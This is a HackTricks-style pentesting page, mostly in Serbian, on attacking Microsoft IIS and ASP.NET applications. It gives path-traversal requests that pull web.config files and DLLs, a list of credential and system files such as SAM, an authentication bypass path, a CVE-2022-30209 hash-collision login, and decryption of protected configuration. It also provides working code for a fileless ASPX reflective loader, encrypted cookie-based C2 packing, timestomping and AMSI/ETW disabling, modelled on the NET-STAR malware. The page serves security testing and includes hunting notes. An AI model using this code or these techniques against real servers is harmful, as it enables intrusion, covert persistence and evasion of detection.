# IIS - Internet Information Services

{{#include ../../banners/hacktricks-training.md}}

Test ekstenzije izvršnih fajlova:

- asp
- aspx
- config
- php

## Otkrivanje interne IP adrese

Na bilo kom IIS serveru na kojem dobijete 302 možete pokušati ukloniti Host header i koristiti HTTP/1.0 i u odgovoru Location header može ukazivati na internu IP adresu:
```
nc -v domain.com 80
openssl s_client -connect domain.com:443
```
Odgovor koji otkriva internu IP adresu:
```
GET / HTTP/1.0

HTTP/1.1 302 Moved Temporarily
Cache-Control: no-cache
Pragma: no-cache
Location: https://192.168.5.237/owa/
Server: Microsoft-IIS/10.0
X-FEServer: NHEXCHANGE2016
```
## Izvršavanje .config fajlova

Možete otpremiti .config fajlove i koristiti ih za izvršavanje koda. Jedan način je dodavanje koda na kraj fajla unutar HTML komentara: [Preuzmi primer ovde](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config)

Više informacija i tehnika za iskorišćavanje ove ranjivosti možete pronaći [ovde](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/)

## IIS otkrivanje Bruteforce

Preuzmite listu koju sam napravio:

{{#file}}
iisfinal.txt
{{#endfile}}

Nastala je spajanjem sadržaja sledećih lista:

[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt)\
[http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html](http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html)\
[https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt](https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt)\
[https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt](https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt)

Koristite je bez dodavanja ekstenzije; fajlovi kojima je potrebna već je imaju.

## Path Traversal

### Leaking source code

Pročitajte kompletan writeup na: [https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html](https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html)

> [!TIP]
> Kao rezime, postoji nekoliko web.config fajlova unutar foldera aplikacije sa referencama na "**assemblyIdentity**" fajlove i "**namespaces**". Sa tim informacijama moguće je znati **gde se izvršni fajlovi nalaze** i preuzeti ih.\
> Iz **preuzetih Dlls** takođe je moguće pronaći **nove namespaces** gde treba pokušati pristupiti i dobiti web.config fajl kako bi se našli novi namespaces i assemblyIdentity.\
> Takođe, fajlovi **connectionstrings.config** i **global.asax** mogu sadržati zanimljive informacije.

U **.Net MVC applications**, fajl **web.config** ima ključnu ulogu specificirajući svaki binarni fajl na koji aplikacija zavisi kroz **"assemblyIdentity"** XML tagove.

### **Istraživanje binarnih fajlova**

Primer pristupa fajlu **web.config** prikazan je ispod:
```html
GET /download_page?id=..%2f..%2fweb.config HTTP/1.1
Host: example-mvc-application.minded
```
Ovaj zahtev otkriva razna podešavanja i zavisnosti, kao što su:

- **EntityFramework** verzija
- **AppSettings** za web stranice, validaciju klijenta i JavaScript
- **System.web** konfiguracije za autentifikaciju i runtime
- **System.webServer** podešavanja modula
- **Runtime** assembly bindings za brojne biblioteke kao što su **Microsoft.Owin**, **Newtonsoft.Json**, i **System.Web.Mvc**

Ova podešavanja ukazuju da se određeni fajlovi, kao na primer **/bin/WebGrease.dll**, nalaze u /bin folderu aplikacije.

### **Datoteke u korenskom direktorijumu**

Fajlovi pronađeni u korenskom direktorijumu, kao što su **/global.asax** i **/connectionstrings.config** (koji sadrži osetljive lozinke), su ključni za konfiguraciju i rad aplikacije.

### **Prostori imena i web.config**

MVC aplikacije takođe definišu dodatne **web.config** fajlove za specifične prostore imena kako bi se izbegle ponovljene deklaracije u svakom fajlu, što je demonstrirano zahtevom za preuzimanje još jednog **web.config**:
```html
GET /download_page?id=..%2f..%2fViews/web.config HTTP/1.1
Host: example-mvc-application.minded
```
### **Preuzimanje DLL-ova**

Spominjanje prilagođenog namespace-a ukazuje na DLL naziva "**WebApplication1**" prisutan u /bin direktorijumu. Nakon toga prikazan je zahtev za preuzimanje **WebApplication1.dll**:
```html
GET /download_page?id=..%2f..%2fbin/WebApplication1.dll HTTP/1.1
Host: example-mvc-application.minded
```
Ovo sugeriše prisustvo drugih bitnih DLL-ova, kao što su **System.Web.Mvc.dll** i **System.Web.Optimization.dll**, u /bin direktorijumu.

U scenariju gde DLL uvozi namespace pod imenom **WebApplication1.Areas.Minded**, napadač može zaključiti postojanje drugih web.config fajlova na predvidivim putanjama, poput **/area-name/Views/**, koji sadrže specifične konfiguracije i reference na druge DLL-ove u /bin folderu. Na primer, zahtev ka **/Minded/Views/web.config** može otkriti konfiguracije i namespace-ove koji ukazuju na prisustvo drugog DLL-a, **WebApplication1.AdditionalFeatures.dll**.

### Uobičajene datoteke

Iz [ovde](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
```
C:\Apache\conf\httpd.conf
C:\Apache\logs\access.log
C:\Apache\logs\error.log
C:\Apache2\conf\httpd.conf
C:\Apache2\logs\access.log
C:\Apache2\logs\error.log
C:\Apache22\conf\httpd.conf
C:\Apache22\logs\access.log
C:\Apache22\logs\error.log
C:\Apache24\conf\httpd.conf
C:\Apache24\logs\access.log
C:\Apache24\logs\error.log
C:\Documents and Settings\Administrator\NTUser.dat
C:\php\php.ini
C:\php4\php.ini
C:\php5\php.ini
C:\php7\php.ini
C:\Program Files (x86)\Apache Group\Apache\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache\logs\access.log
C:\Program Files (x86)\Apache Group\Apache\logs\error.log
C:\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache2\logs\access.log
C:\Program Files (x86)\Apache Group\Apache2\logs\error.log
c:\Program Files (x86)\php\php.ini"
C:\Program Files\Apache Group\Apache\conf\httpd.conf
C:\Program Files\Apache Group\Apache\conf\logs\access.log
C:\Program Files\Apache Group\Apache\conf\logs\error.log
C:\Program Files\Apache Group\Apache2\conf\httpd.conf
C:\Program Files\Apache Group\Apache2\conf\logs\access.log
C:\Program Files\Apache Group\Apache2\conf\logs\error.log
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\Program Files\MySQL\my.cnf
C:\Program Files\MySQL\my.ini
C:\Program Files\MySQL\MySQL Server 5.0\my.cnf
C:\Program Files\MySQL\MySQL Server 5.0\my.ini
C:\Program Files\MySQL\MySQL Server 5.1\my.cnf
C:\Program Files\MySQL\MySQL Server 5.1\my.ini
C:\Program Files\MySQL\MySQL Server 5.5\my.cnf
C:\Program Files\MySQL\MySQL Server 5.5\my.ini
C:\Program Files\MySQL\MySQL Server 5.6\my.cnf
C:\Program Files\MySQL\MySQL Server 5.6\my.ini
C:\Program Files\MySQL\MySQL Server 5.7\my.cnf
C:\Program Files\MySQL\MySQL Server 5.7\my.ini
C:\Program Files\php\php.ini
C:\Users\Administrator\NTUser.dat
C:\Windows\debug\NetSetup.LOG
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\php.ini
C:\Windows\repair\SAM
C:\Windows\repair\system
C:\Windows\System32\config\AppEvent.evt
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\RegBack\system
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SecEvent.evt
C:\Windows\System32\config\SysEvent.evt
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\winevt\Logs\Application.evtx
C:\Windows\System32\winevt\Logs\Security.evtx
C:\Windows\System32\winevt\Logs\System.evtx
C:\Windows\win.ini
C:\xampp\apache\conf\extra\httpd-xampp.conf
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\xampp\FileZillaFTP\FileZilla Server.xml
C:\xampp\MercuryMail\MERCURY.INI
C:\xampp\mysql\bin\my.ini
C:\xampp\php\php.ini
C:\xampp\security\webdav.htpasswd
C:\xampp\sendmail\sendmail.ini
C:\xampp\tomcat\conf\server.xml
```
## HTTPAPI 2.0 404 greška

If you see an error like the following one:

![](<../../images/image (446) (1) (2) (2) (3) (3) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (10) (2).png>)

To znači da server **nije primio tačan naziv domena** unutar Host header-a.\
Da biste pristupili web stranici, pogledajte posluženi **SSL Certificate** — možda tamo nađete ime domena/poddomena. Ako ga nema, možda ćete morati da **brute force VHosts** dok ne pronađete ispravan.

## Dekriptirajte šifrovanu konfiguraciju i ASP.NET Core Data Protection key rings

Dva uobičajena obrasca za zaštitu tajni u .NET aplikacijama hostovanim na IIS-u su:
- ASP.NET Protected Configuration (RsaProtectedConfigurationProvider) za sekcije web.config kao što su <connectionStrings>.
- ASP.NET Core Data Protection key ring (koji se čuva lokalno) koristi se za zaštitu tajni aplikacije i kolačića.

Ako imate pristup datotečnom sistemu ili interaktivan pristup web serveru, ključevi koji se nalaze na istom mestu često omogućavaju dekripciju.

- ASP.NET (Full Framework) – dešifrujte zaštićene sekcije konfiguracije pomoću aspnet_regiis:
```cmd
# Decrypt a section by app path (site configured in IIS)
%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\aspnet_regiis.exe -pd "connectionStrings" -app "/MyApplication"

# Or specify the physical path (-pef/-pdf write/read to a config file under a dir)
%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\aspnet_regiis.exe -pdf "connectionStrings" "C:\inetpub\wwwroot\MyApplication"
```
- ASP.NET Core – potražite Data Protection key rings koji su uskladišteni lokalno (XML/JSON fajlovi) na lokacijama kao što su:
- %PROGRAMDATA%\Microsoft\ASP.NET\DataProtection-Keys
- HKLM\SOFTWARE\Microsoft\ASP.NET\Core\DataProtection-Keys (registry)
- App-managed folder (e.g., App_Data\keys or a Keys directory next to the app)

Sa dostupnim key ring-om, operator koji radi u identitetu aplikacije može instancirati IDataProtector sa istim purposes i unprotect-ovati uskladištene tajne. Pogrešne konfiguracije koje čuvaju key ring zajedno sa fajlovima aplikacije čine offline dešifrovanje trivijalnim nakon kompromitovanja hosta.

## IIS fileless backdoors and in-memory .NET loaders (NET-STAR style)

The Phantom Taurus/NET-STAR toolkit prikazuje zreo obrazac za fileless IIS persistence i post‑exploitation potpuno unutar w3wp.exe. Osnovne ideje su široko ponovo upotrebljive za custom tradecraft i za detection/hunting.

Key building blocks
- ASPX bootstrapper hosting an embedded payload: jedna .aspx stranica (npr., OutlookEN.aspx) nosi Base64‑encoded, opciono Gzip‑compressed .NET DLL. Na trigger request dekodira, dekompresuje i reflectively loads u trenutni AppDomain i poziva glavni entry point (npr., ServerRun.Run()).
- Cookie‑scoped, encrypted C2 with multi‑stage packing: zadaci/rezultati se pakuju Gzip → AES‑ECB/PKCS7 → Base64 i prenose putem naizgled legitimnih cookie‑heavy requests; operatori su koristili stabilne delimitere (npr., "STAR") za podelu na delove.
- Reflective .NET execution: prihvata proizvoljne managed assemblies kao Base64, učitava preko Assembly.Load(byte[]) i prosleđuje operator args za brzo menjanje modula bez pisanja na disk.
- Operating in precompiled ASP.NET sites: dodavanje/održavanje pomoćnih shells/backdoors čak i kada je sajt precompiled (npr., dropper dodaje dynamic pages/handlers ili koristi config handlers) – izloženo komandama kao što su bypassPrecompiledApp, addshell, listshell, removeshell.
- Timestomping/metadata forgery: izložiti changeLastModified action i timestomp pri deploymentu (uključujući buduće compilation timestamps) da bi se otežao DFIR.
- Optional AMSI/ETW pre‑disable for loaders: second‑stage loader može onemogućiti AMSI i ETW pre poziva Assembly.Load kako bi se smanjila inspekcija in‑memory payload‑a.

Minimalni ASPX loader pattern
```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.IO.Compression" %>
<%@ Import Namespace="System.Reflection" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e){
// 1) Obtain payload bytes (hard‑coded blob or from request)
string b64 = /* hardcoded or Request["d"] */;
byte[] blob = Convert.FromBase64String(b64);
// optional: decrypt here if AES is used
using(var gz = new GZipStream(new MemoryStream(blob), CompressionMode.Decompress)){
using(var ms = new MemoryStream()){
gz.CopyTo(ms);
var asm = Assembly.Load(ms.ToArray());
// 2) Invoke the managed entry point (e.g., ServerRun.Run)
var t = asm.GetType("ServerRun");
var m = t.GetMethod("Run", BindingFlags.Public|BindingFlags.NonPublic|BindingFlags.Static|BindingFlags.Instance);
object inst = m.IsStatic ? null : Activator.CreateInstance(t);
m.Invoke(inst, new object[]{ HttpContext.Current });
}
}
}
</script>
```
Pomoćni alati za packovanje/crypto (Gzip + AES‑ECB + Base64)
```csharp
using System.Security.Cryptography;

static byte[] AesEcb(byte[] data, byte[] key, bool encrypt){
using(var aes = Aes.Create()){
aes.Mode = CipherMode.ECB; aes.Padding = PaddingMode.PKCS7; aes.Key = key;
ICryptoTransform t = encrypt ? aes.CreateEncryptor() : aes.CreateDecryptor();
return t.TransformFinalBlock(data, 0, data.Length);
}
}

static string Pack(object obj, byte[] key){
// serialize → gzip → AES‑ECB → Base64
byte[] raw = Serialize(obj);                    // your TLV/JSON/msgpack
using var ms = new MemoryStream();
using(var gz = new GZipStream(ms, CompressionLevel.Optimal, true)) gz.Write(raw, 0, raw.Length);
byte[] enc = AesEcb(ms.ToArray(), key, true);
return Convert.ToBase64String(enc);
}

static T Unpack<T>(string b64, byte[] key){
byte[] enc = Convert.FromBase64String(b64);
byte[] cmp = AesEcb(enc, key, false);
using var gz = new GZipStream(new MemoryStream(cmp), CompressionMode.Decompress);
using var outMs = new MemoryStream(); gz.CopyTo(outMs);
return Deserialize<T>(outMs.ToArray());
}
```
Cookie/session tok i command surface

- Session bootstrap i tasking se prenose putem cookies kako bi se uklopili u normalnu web aktivnost.
- Komande primećene u divljini uključivale su: fileExist, listDir, createDir, renameDir, fileRead, deleteFile, createFile, changeLastModified; addshell, bypassPrecompiledApp, listShell, removeShell; executeSQLQuery, ExecuteNonQuery; i dinamičke izvršne primitive code_self, code_pid, run_code za in‑memory .NET execution.

Timestomping alat
```csharp
File.SetCreationTime(path, ts);
File.SetLastWriteTime(path, ts);
File.SetLastAccessTime(path, ts);
```
Inline onemogućavanje AMSI/ETW pre Assembly.Load (loader variant)
```csharp
// Patch amsi!AmsiScanBuffer to return E_INVALIDARG
// and ntdll!EtwEventWrite to a stub; then load operator assembly
DisableAmsi();
DisableEtw();
Assembly.Load(payloadBytes).EntryPoint.Invoke(null, new object[]{ new string[]{ /* args */ } });
```
Pogledajte AMSI/ETW bypass techniques u: windows-hardening/av-bypass.md

Hunting notes (defenders)
- Pojedinačna, neobična ASPX stranica sa veoma dugim Base64/Gzip blobovima; POST zahtevi sa puno cookie‑ja.
- Unbacked managed modules unutar w3wp.exe; stringovi kao Encrypt/Decrypt (ECB), Compress/Decompress, GetContext, Run.
- Ponavljajući delimiteri kao "STAR" u saobraćaju; neusaglašeni ili čak budući timestamps na ASPX/assemblies.

## Old IIS vulnerabilities worth looking for


### Microsoft IIS tilde character “~” Vulnerability/Feature – Short File/Folder Name Disclosure

Možete pokušati da **enumerišete foldere i fajlove** unutar svakog otkrivenog foldera (čak i ako zahteva Basic Authentication) koristeći ovu **tehniku**.\
Glavno ograničenje ove tehnike ako je server ranjiv je da **može otkriti samo prvih 6 slova imena svakog fajla/foldera i prva 3 slova ekstenzije** fajlova.

Možete koristiti [https://github.com/irsdl/IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner) da testirate ovu ranjivost:`java -jar iis_shortname_scanner.jar 2 20 http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db/`

![](<../../images/image (844).png>)

Original research: [https://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf](https://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf)

Možete takođe koristiti **metasploit**: `use scanner/http/iis_shortname_scanner`

Dobra ideja za **otkrivanje finalnog imena** pronađenih fajlova je da **pitate LLMs** za opcije, kao što je urađeno u skriptu [https://github.com/Invicti-Security/brainstorm/blob/main/fuzzer_shortname.py](https://github.com/Invicti-Security/brainstorm/blob/main/fuzzer_shortname.py)

### Basic Authentication bypass

Bypass a basic authentication (**IIS 7.5**) pokušavajući da pristupite: `/admin:$i30:$INDEX_ALLOCATION/admin.php` ili `/admin::$INDEX_ALLOCATION/admin.php`

Možete pokušati da **kombinujete** ovu **ranjivost** i prethodnu kako biste pronašli nove **foldere** i bypass-ovali autentifikaciju.

## ASP.NET Trace.AXD enabled debugging

ASP.NET uključuje debug mod i njegov fajl se zove `trace.axd`.

On čuva veoma detaljan log svih zahteva upućenih aplikaciji tokom određenog vremenskog perioda.

Ove informacije uključuju IP adrese udaljenih klijenata, session ID‑eve, sve request i response cookie‑je, fizičke putanje, informacije o source code‑u, i potencijalno čak korisnička imena i lozinke.

[https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/](https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/)

![Screenshot 2021-03-30 at 13 19 11](https://user-images.githubusercontent.com/31736688/112974448-2690b000-915b-11eb-896c-f41c27c44286.png)

## ASPXAUTH Cookie

ASPXAUTH koristi sledeće informacije:

- **`validationKey`** (string): hex-enkodovan ključ za verifikaciju potpisa.
- **`decryptionMethod`** (string): (default “AES”).
- **`decryptionIV`** (string): hex-enkodovan initialization vector (podrazumevano vektor nula).
- **`decryptionKey`** (string): hex-enkodovan ključ za dekripciju.

Međutim, neki ljudi će koristiti **default vrednosti** ovih parametara i koristiti kao **cookie email korisnika**. Dakle, ako možete naći web koji koristi istu platformu i koji koristi ASPXAUTH cookie i **na tom drugom serveru kreirate korisnika sa emailom korisnika kojeg želite da impersonate**, možda ćete moći da iskoristite cookie sa drugog servera na prvom i impersonate tog korisnika.\
Ovaj napad je uspeo u ovom [**writeup‑u**](https://infosecwriteups.com/how-i-hacked-facebook-part-two-ffab96d57b19).

## IIS Authentication Bypass with cached passwords (CVE-2022-30209) <a href="#id-3-iis-authentication-bypass" id="id-3-iis-authentication-bypass"></a>

[Full report here](https://blog.orange.tw/2022/08/lets-dance-in-the-cache-destabilizing-hash-table-on-microsoft-iis.html): Bag u kodu **nije pravilno proveravao lozinku koju je dao korisnik**, tako da napadač čiji **password hash pada na key** koji je već u **cache‑u** će moći da se prijavi kao taj korisnik.
```python
# script for sanity check
> type test.py
def HashString(password):
j = 0
for c in map(ord, password):
j = c + (101*j)&0xffffffff
return j

assert HashString('test-for-CVE-2022-30209-auth-bypass') == HashString('ZeeiJT')

# before the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 401 Unauthorized

# after the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 200 OK
```
## Izvori

- [Unit 42 – Phantom Taurus: A New Chinese Nexus APT and the Discovery of the NET-STAR Malware Suite](https://unit42.paloaltonetworks.com/phantom-taurus/)
- [AMSI/ETW bypass background (HackTricks)](../../windows-hardening/av-bypass.md)

{{#include ../../banners/hacktricks-training.md}}
